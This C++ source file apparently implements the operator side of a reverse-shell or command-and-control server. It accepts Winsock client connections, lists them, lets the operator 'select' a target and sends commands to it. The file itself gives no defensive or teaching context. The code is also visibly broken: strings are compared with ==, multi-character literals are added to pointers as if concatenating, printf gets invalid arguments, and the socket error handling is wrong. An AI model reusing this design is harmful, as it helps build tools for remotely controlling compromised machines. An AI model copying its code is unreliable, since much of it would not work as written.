#include "server.hpp"


Server::Server(const char* port) { lport = port; }

void Server::handler_print_help() {
    printf("help... figure it out yourself!\n");
}

void Server::initialize() {
    // Initialize Winsock
    iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (iResult != 0) {
        printf("WSAStartup failed with error: %d\n", iResult);
    }
    ZeroMemory(&hints, sizeof(hints));
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;
    hints.ai_flags = AI_PASSIVE;

    // Resolve the server address and port
    iResult = getaddrinfo(NULL, lport, &hints, &AddrInfo);
    if (iResult != 0) {
        printf("getaddrinfo failed with error: %d\n", iResult);
        WSACleanup();
        return;
    } printf("got address info\n");
}


int Server::quit_gracefully() {
    for (auto conn : all_connections)
    {
        iResult = shutdown(conn, SD_SEND);
        if (iResult == SOCKET_ERROR) {
            printf("shutdown failed with error: %d\n", WSAGetLastError());
            closesocket(conn);
            WSACleanup();
            return 0;
        }
        else { return 1; }
    } return 0;
}


void Server::create_socket() {
    // Create a SOCKET for connecting to server
    ListenSocket = socket(AddrInfo->ai_family, AddrInfo->ai_socktype, AddrInfo->ai_protocol);
    if (ListenSocket == INVALID_SOCKET) {
        printf("socket failed with error: %ld\n", WSAGetLastError());
        freeaddrinfo(AddrInfo);
        WSACleanup();
        return;
    }
    printf("socket created\n");
}


void Server::bind_socket() {
    // setup the TCP listening socket
    iResult = bind(ListenSocket, AddrInfo->ai_addr, (int)AddrInfo->ai_addrlen);
    listen(ListenSocket, SOMAXCONN);
    
    if (iResult == SOCKET_ERROR) {
        printf("bind failed with error: %d\n", WSAGetLastError());
        std::this_thread::sleep_for(std::chrono::seconds(10));
        bind_socket();
    }
    printf("socket bind\n");
    return;
}


void Server::accept_connections() {
    printf("counting clients\n");
    for (auto c : all_connections) {
        closesocket(c);
        WSACleanup();
    }
    std::string address;
    printf("starting loop\n");
    while (1) {
        std::this_thread::sleep_for(std::chrono::milliseconds(500));
        try {
            printf("accept\n");
            ClientSocket = accept(ListenSocket, NULL, NULL);
            memset(rdata, 0, sizeof(rdata));
            iResult = recv(ClientSocket, rdata, BUFFER_SIZE, 0);
            printf("recv\n");
            address.append((LPCSTR)AddrInfo->ai_addr);
            address.append((LPCSTR)rdata);
        }
        catch (const std::exception&) {
            printf("Error accepting connections: %d", WSAGetLastError());
            closesocket(ListenSocket);
            WSACleanup();
            continue;
        }
        printf("freeing addrinfo\n");
        freeaddrinfo(AddrInfo);
        all_connections.push_back(ClientSocket);
        printf("adding addr info to all_addresses\n");
        all_addresses.push_back(address);
        printf("\nConnection has been established: %s\n", address);
    }
    closesocket(ListenSocket);
    return;
}


void Server::start_handler() {
    char input[15];
    unsigned short int index;
    while (1) {
        printf("handler> ");
        //TODO fix input bugs
        scanf_s("%s %*hd", &input, (unsigned)_countof(input), &index);

        if (input == "clear" || input == "cls") {
            ShellExecute(GetConsoleWindow(), L"open", L"cls", NULL, NULL, 0);
        }
        else if (input == "list") {
            list_connections();
            continue;
        }
        else if (input == "select") {
            BOOL is_new_session = change_target(index);
            if (is_new_session) {
                send_commands();
            } else { continue; }
        }
        else if (input == "shutdown") {
            closesocket(ClientSocket);
            WSACleanup();
            break;
        }
        else if (input == "help") {
            handler_print_help();
        }
        else if (input == "") {
            printf(""); //pass
        }
        else {
            printf("Command not recognized\n");
        }
    }
    return;
}


void Server::list_connections() {
    const char* results = "";
    // list all connections
    for (auto i : all_connections) {
        try {
            send(ClientSocket, " ", BUFFER_SIZE, 0);
            recv(ClientSocket, rdata, BUFFER_SIZE, 0);
        }
        catch (...) {
            all_connections.erase(all_connections.begin());
            all_addresses.erase(all_addresses.begin());
            continue;
        }
        results = (LPSTR)i + '   ' + all_addresses[i][0] 
            + '   ' + all_addresses[i][1] + '   ' + all_addresses[i][2] + '\n';
    }
    printf("-------- Clients --------\n%s\n", results);
}


bool Server::change_target(unsigned short int target) {
    if (!isdigit(target)) {
        printf("Client index should be an integer\n");
        return false;
    }
    else {
        try {
            ClientSocket = all_connections[target];
        }
        catch (...) {
            printf("Not a valid selection\n");
            return false;
        }
    }
    printf("You are now connected to " + all_addresses[target][2] + '\n');
    return true;
}

/*
void Server::read_command_output() {

}

void Server::recvall() {

}
*/

void Server::send_commands() {
    send(ClientSocket, " ", BUFFER_SIZE, 0);
    memset(rdata, 0, sizeof(rdata));
    iResult = recv(ClientSocket, rdata, BUFFER_SIZE, 0);
}
